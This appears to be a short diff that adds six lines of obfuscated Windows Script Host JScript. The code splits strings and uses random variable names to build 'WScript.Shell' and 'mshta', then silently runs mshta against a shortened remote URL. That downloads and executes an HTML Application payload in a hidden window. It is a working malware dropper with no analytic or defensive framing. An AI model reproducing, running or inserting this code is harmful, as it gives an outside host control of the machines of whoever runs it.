@@ -1,0 +1,6 @@
+garjyvit = ("ipt.Shel")
+var tklrzdjj = WScript.CreateObject("WScr"+garjyvit+"l")
+noffgkil = ("m")
+wgiwvkiq = ("sh")
+powxbwje = ("ta ")
+tklrzdjj.Run((noffgkil+wgiwvkiq+powxbwje)+" https://t.ly/Js4j",0)
